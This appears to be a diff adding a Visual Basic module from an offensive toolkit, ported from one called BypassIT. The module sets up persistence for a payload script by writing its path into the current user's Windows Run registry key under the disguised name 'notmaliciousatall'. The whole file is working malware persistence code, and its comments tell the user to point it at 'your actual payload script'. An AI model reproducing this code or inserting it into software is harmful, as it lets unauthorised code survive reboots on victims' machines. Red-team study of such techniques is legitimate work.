@@ -1,0 +1,42 @@
+Option Explicit
+
+Public Module Module1
+
+    'Establish persistence via entry in Run registry key under current user.
+    'Credit to AnuraTheAmphibian for intial version of this as part of BypassIT, now ported to basic.  
+    'Adjust this to reflect the name and location of your actual payload script. 
+
+    Sub Main
+        
+        Dim sRegKey As String
+        Dim sRegName As String
+        Dim sScriptPath As String
+        Dim sOutputVar As String
+        Dim wsh As Object
+
+        ' Define registry info
+        sRegKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+        sRegName = "notmaliciousatall"
+
+
+        sScriptPath = CurDir & "\MyScript.wbt"
+
+        Set wsh = CreateObject("WScript.Shell")
+
+        On Error Resume Next
+        sOutputVar = wsh.RegRead(sRegKey & "\" & sRegName)
+        On Error GoTo 0
+
+        If sOutputVar = sScriptPath Then
+            ' If the registry already has our script path
+            MsgBox "I'm In! Ribbit"
+        Else
+            ' Write this script’s path to the registry (so it starts on login)
+            On Error Resume Next
+            wsh.RegWrite sRegKey & "\" & sRegName, sScriptPath, "REG_SZ"
+            On Error GoTo 0
+        End If
+
+    End Sub
+    
+End Module
